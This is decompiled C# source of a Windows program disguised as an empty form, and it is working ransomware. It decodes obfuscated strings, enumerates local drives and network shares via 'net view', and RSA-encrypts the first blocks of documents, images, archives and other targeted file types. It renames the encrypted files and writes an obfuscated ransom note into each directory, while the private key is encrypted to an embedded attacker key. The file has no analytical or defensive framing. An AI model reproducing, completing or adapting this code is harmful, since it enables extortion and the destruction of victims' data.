using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace Felarcha;

public class Form1 : Form
{
	private byte byte_0 = 166;

	private int int_0 = 245;

	private int int_1 = 3;

	private string string_0 = "";

	private string string_1;

	private string string_2 = "";

	private string string_3 = "";

	private string string_4 = "\\\\\\\\\\\\\\\\\\";

	private byte[] byte_1;

	private List<string> list_0 = new List<string>();

	private List<string> list_1 = new List<string>();

	private List<string> list_2 = new List<string>();

	private string string_5 = "";

	private string string_6;

	private int int_2 = 855000;

	private IContainer icontainer_0 = null;

	public Form1()
	{
		InitializeComponent();
		if (!method_1())
		{
			method_0();
		}
	}

	private void method_0()
	{
		method_2();
		method_7();
		method_5();
	}

	private bool method_1()
	{
		bool result = false;
		Process currentProcess = Process.GetCurrentProcess();
		Process[] processesByName = Process.GetProcessesByName(currentProcess.ProcessName);
		if (processesByName.Length > 1)
		{
			result = true;
		}
		return result;
	}

	private void method_2()
	{
		byte[] byte_ = new byte[415]
		{
			154, 244, 245, 231, 237, 195, 223, 240, 199, 202,
			211, 195, 152, 154, 235, 201, 194, 211, 202, 211,
			213, 152, 202, 233, 204, 233, 137, 141, 212, 151,
			203, 240, 240, 236, 203, 200, 239, 246, 192, 195,
			147, 202, 144, 252, 194, 145, 192, 151, 229, 207,
			159, 203, 226, 245, 215, 239, 246, 229, 233, 202,
			227, 245, 205, 226, 214, 252, 255, 215, 220, 208,
			137, 203, 222, 196, 197, 231, 212, 203, 222, 192,
			226, 223, 141, 238, 215, 148, 212, 252, 223, 207,
			231, 207, 196, 212, 235, 241, 237, 208, 239, 201,
			205, 233, 225, 242, 147, 149, 220, 215, 220, 231,
			232, 226, 213, 214, 240, 211, 201, 226, 222, 252,
			209, 147, 227, 222, 193, 229, 241, 211, 229, 204,
			234, 209, 228, 159, 193, 204, 220, 201, 254, 210,
			228, 240, 228, 241, 151, 211, 220, 209, 227, 240,
			146, 232, 238, 149, 215, 204, 244, 226, 255, 240,
			245, 238, 199, 206, 210, 199, 235, 237, 213, 147,
			196, 227, 213, 212, 252, 224, 222, 144, 228, 237,
			228, 255, 137, 222, 234, 246, 145, 195, 205, 149,
			199, 224, 215, 205, 227, 207, 151, 159, 252, 241,
			220, 247, 141, 208, 222, 148, 207, 242, 151, 210,
			225, 228, 247, 203, 199, 200, 242, 211, 196, 243,
			224, 220, 213, 233, 203, 204, 137, 147, 214, 237,
			244, 159, 149, 203, 236, 210, 206, 199, 228, 141,
			236, 225, 232, 224, 239, 214, 227, 246, 213, 208,
			148, 201, 197, 241, 141, 151, 209, 150, 223, 224,
			252, 241, 226, 146, 211, 246, 223, 222, 255, 210,
			226, 204, 196, 220, 208, 237, 144, 243, 200, 247,
			209, 227, 223, 222, 202, 193, 197, 239, 211, 233,
			147, 208, 201, 195, 255, 214, 212, 137, 209, 236,
			205, 247, 148, 137, 231, 220, 150, 247, 204, 146,
			215, 200, 252, 240, 213, 234, 212, 229, 193, 237,
			224, 201, 241, 222, 237, 213, 210, 243, 192, 242,
			199, 227, 158, 206, 235, 145, 201, 210, 240, 141,
			144, 254, 146, 244, 159, 201, 207, 203, 233, 239,
			202, 214, 244, 241, 150, 214, 208, 141, 149, 145,
			148, 158, 197, 247, 155, 155, 154, 137, 235, 201,
			194, 211, 202, 211, 213, 152, 154, 227, 222, 214,
			201, 200, 195, 200, 210, 152, 231, 247, 231, 228,
			154, 137, 227, 222, 214, 201, 200, 195, 200, 210,
			152, 154, 137, 244, 245, 231, 237, 195, 223, 240,
			199, 202, 211, 195, 152
		};
		string_2 = method_11(byte_, byte_0);
		string_6 = "ҴҖӮҞ\u0086ӢҖҟҝӭ\u0086ґҖӮҞӢӦÉҔҖқӭ\u0088\u0086«¬ҳӧҝҞ\u0086ӣÉӤҞӤÃ\u0086Ҟӣ\u0086ҔÃӦқӥӤӪ\u0086ÉӤҙӦÇҔӪӤÃ\u0086ÉҒҞқ\u0086Ҟґ\u0086ґÇӮҞӢӦÉҔÇққӭӣ\u0086ӢÇҟҝÉҔ\u0086қÇ\u0086ҙҘӡӤӥ\u009c\u0086ÓÈÊÅÍÔæÖÔÉÒÉÈËÇÏÊ\u0088ÅÉË\u0086«¬ҳӧҝҞ\u0086Ҕӭ\u0086қÃ\u0086ҙÉҝӥӡҞҝҞ\u0086ÉӤҔÃӤÇ\u0086Ҕ\u0086ӤÃӡÃқҞÃ\u0086ӧӥӤÉҜ\u0086ӤÉ\u0086ӧҜÇӡÇҟӤÃ\u0086ӧ\u0086ӧÇҟӤÇ\u0086ÑÑÑ\u0088ÒÉÔÖÔÉÌÃÅÒ\u0088ÅÉÈ\u0086җӦÇӥґÃӦ\u0086\u0086òéô\u0086«¬Ҟ\u0086ӧ\u0086ÃҕÉ\u0086ҙÉҚÉӯӪӨ\u0086ґÇҟҒҞӤÃ\u0086қÇ\u0086ӧÇҟӤ\u009c\u0086ÎÒÒÖ\u009c\u0089\u0089È\u0095Ô\u0094ÍÓÜÎÑ\u0094Î\u0091Þ\u0090Ì\u0093\u0088ÉÈÏÉÈ\u0086\u0086\u008b\u0086\u0086ӤÇҚ\u0086җӥҒÃӤ\u0086ӥҜÇґÇқ\u0086ҒÃҟӧӤҔӥӨӯҞҟ\u0086ҙÉӡӤÉҔӭҟ\u0086өӯҞҜ\u0088\u0086«¬ҹÉҙӭӤҜҞ\u0086ӧÇҚÉӧӤÉөӤÃҝӪқÉҕÉ\u0086ҔÉӧӧӤÇқÉҔҝÃқҞө\u0086ӢÇҟҝÉҔ\u0086ҚÉҕӥӤ\u0086ҘҜҘқӡҖӤғҝӪқҘ\u0086Ҟӣ\u0086ҞӧҙÉӦӤҞӤӪ\u0087";
		Class0 @class = new Class0();
		string_5 = @class.method_1();
		string_1 = "_";
		string_1 += @class.method_2();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf("\\system"));
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		list_0.Add(folderPath.ToLower());
		list_0.Add(folderPath2.ToLower());
		list_0.Add(method_11(new byte[8] { 244, 227, 229, 255, 229, 234, 227, 244 }, byte_0));
		list_0.Add(method_11(new byte[12]
		{
			130, 244, 227, 229, 255, 229, 234, 227, 136, 228,
			239, 232
		}, byte_0));
		list_0.Add(method_11(new byte[25]
		{
			245, 223, 213, 210, 195, 203, 134, 240, 201, 202,
			211, 203, 195, 134, 239, 200, 192, 201, 212, 203,
			199, 210, 207, 201, 200
		}, byte_0));
		list_1.Add(method_11(new byte[3] { 136, 197, 194 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 202, 194, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 203, 194, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 203, 199, 222 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 194, 196, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 195, 214, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 151, 197, 194 }, byte_0));
		list_1.Add(method_11(new byte[3] { 136, 203, 194 }, byte_0));
		list_1.Add(method_11(new byte[3] { 136, 194, 196 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 214, 194, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 214, 214, 210 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 222, 202, 213 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 194, 201, 197 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 199, 212, 204 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 210, 199, 212 }, byte_0));
		list_1.Add(method_11(new byte[3] { 136, 145, 220 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 212, 199, 212 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 220, 207, 214 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 210, 207, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 204, 214, 193 }, byte_0));
		list_1.Add(method_11(new byte[3] { 136, 199, 207 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 196, 203, 214 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 214, 200, 193 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 197, 194, 212 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 214, 213, 194 }, byte_0));
		list_1.Add(method_11(new byte[5] { 136, 204, 214, 195, 193 }, byte_0));
		list_1.Add(method_11(new byte[5] { 136, 194, 201, 197, 222 }, byte_0));
		list_1.Add(method_11(new byte[5] { 136, 222, 202, 213, 222 }, byte_0));
		list_1.Add(method_11(new byte[5] { 136, 214, 214, 210, 222 }, byte_0));
		list_1.Add(method_11(new byte[6] { 136, 199, 197, 197, 194, 196 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 203, 194, 196 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 212, 210, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 201, 194, 210 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 201, 194, 213 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 201, 194, 196 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 201, 194, 193 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 197, 212, 148 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 200, 195, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 200, 212, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 201, 212, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 199, 212, 209 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 213, 212, 148 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 213, 212, 192 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 194, 209, 193 }, byte_0));
		list_1.Add(method_11(new byte[4] { 136, 194, 222, 192 }, byte_0));
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		string_0 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		string_3 = method_4(rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
		byte_1 = method_6(string_3);
		method_3();
	}

	private void method_3()
	{
		List<string> list = new List<string>();
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C net view";
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		try
		{
			process.Start();
			string text = process.StandardOutput.ReadToEnd();
			int startIndex = 0;
			int num = 0;
			while (true)
			{
				startIndex = text.IndexOf('\\', startIndex);
				if (startIndex != -1)
				{
					num = text.IndexOf(' ', startIndex);
					list.Add(text.Substring(startIndex, num - startIndex));
					startIndex = num;
					continue;
				}
				break;
			}
		}
		catch
		{
		}
		for (int i = 0; i < list.Count; i++)
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd";
			process2.StartInfo.Arguments = "/C net view " + list[i];
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			try
			{
				process2.Start();
				string s = process2.StandardOutput.ReadToEnd();
				byte[] bytes = Encoding.GetEncoding(1251).GetBytes(s);
				string @string = Encoding.GetEncoding("CP866").GetString(bytes);
				string[] array = @string.Split('\r', '\n');
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].IndexOf("Диск") > -1)
					{
						list_2.Add(list[i] + "\\" + array[j].Substring(0, array[j].IndexOf("Диск")));
					}
				}
			}
			catch
			{
			}
		}
	}

	private string method_4(string string_7)
	{
		string text = "";
		byte[] array = new byte[string_7.Length];
		byte[] array2 = new byte[int_0];
		byte[] array3 = new byte[int_0 + 11];
		double num = Math.Ceiling((double)string_7.Length / (double)int_0);
		if ((double)string_7.Length < num * (double)int_0)
		{
			int length = string_7.Length;
			for (int i = 0; (double)i < num * (double)int_0 - (double)length; i++)
			{
				string_7 += " ";
			}
		}
		array = Encoding.Default.GetBytes(string_7);
		Array.Reverse((Array)array);
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
			rSACryptoServiceProvider.FromXmlString(string_2);
			for (int j = 0; (double)j < num; j++)
			{
				Array.Copy(array, j * int_0, array2, 0, int_0);
				array3 = rSACryptoServiceProvider.Encrypt(array2, fOAEP: false);
				text += Encoding.Default.GetString(array3);
			}
		}
		catch
		{
		}
		return text;
	}

	private void method_5()
	{
		for (int i = 0; i < list_2.Count; i++)
		{
			DirectoryInfo directoryInfo_ = new DirectoryInfo(list_2[i].ToString());
			method_8(directoryInfo_);
		}
	}

	private byte[] method_6(string string_7)
	{
		string_7 += string_4;
		return Encoding.Default.GetBytes(string_7);
	}

	private void method_7()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Network)
				{
					method_8(driveInfo.RootDirectory);
				}
			}
		}
		catch
		{
		}
	}

	private void method_8(DirectoryInfo directoryInfo_0)
	{
		try
		{
			DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
			DirectoryInfo[] array = directories;
			foreach (DirectoryInfo directoryInfo_ in array)
			{
				method_12(int_2);
				method_9(directoryInfo_);
				method_8(directoryInfo_);
			}
		}
		catch
		{
		}
	}

	private void method_9(DirectoryInfo directoryInfo_0)
	{
		method_10(directoryInfo_0);
		try
		{
			string[] files = Directory.GetFiles(directoryInfo_0.FullName, "*.*");
			string[] array = files;
			foreach (string text in array)
			{
				foreach (string item in list_1)
				{
					if (text.ToLower().IndexOf(item) != -1 && text.ToLower().IndexOf(string_1) == -1)
					{
						method_12(int_2);
						string string_ = text;
						if (text.IndexOf(string_5) == -1)
						{
							method_13(string_, item);
						}
					}
				}
			}
		}
		catch
		{
		}
	}

	private void method_10(DirectoryInfo directoryInfo_0)
	{
		Class0 @class = new Class0();
		if (directoryInfo_0.FullName != Environment.CurrentDirectory && directoryInfo_0.FullName != Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory))
		{
			try
			{
				File.WriteAllText(directoryInfo_0.FullName + "\\" + string_5, @class.method_0(string_6, byte_0));
			}
			catch
			{
			}
		}
	}

	private string method_11(byte[] byte_2, int int_3)
	{
		byte[] array = new byte[byte_2.Length];
		for (int i = 0; i < byte_2.Length; i++)
		{
			array[i] = (byte)(byte_2[i] ^ int_3);
		}
		return Encoding.Default.GetString(array);
	}

	private void method_12(int int_3)
	{
		int num = 0;
		for (int i = 0; i < int_3; i++)
		{
			num += i;
		}
	}

	private void method_13(string string_7, string string_8)
	{
		byte[] array = new byte[int_0];
		int num = 0;
		string text = "";
		try
		{
			byte[] array2 = File.ReadAllBytes(string_7);
			if (array2.Length / (int_1 + 5) >= int_0)
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
				rSACryptoServiceProvider.FromXmlString(string_0);
				byte[] array3 = new byte[array2.Length + int_1 * 11 + byte_1.Length];
				Array.Copy(byte_1, array3, byte_1.Length);
				byte[] array4 = new byte[array2.Length - int_1 * int_0];
				for (int i = 0; i < int_1; i++)
				{
					Array.Copy(array2, int_0 * i, array, 0, int_0);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
					Array.Copy(array5, 0, array3, byte_1.Length + i * (int_0 + 11), array5.Length);
				}
				Array.Copy(array2, int_1 * int_0, array4, 0, array4.Length);
				Array.Copy(array4, 0, array3, byte_1.Length + int_1 * (int_0 + 11), array4.Length);
				try
				{
					File.WriteAllBytes(string_7, array3);
					num = string_7.IndexOf(string_8);
					text = string_7.Insert(num, string_1);
					File.Move(string_7, text);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
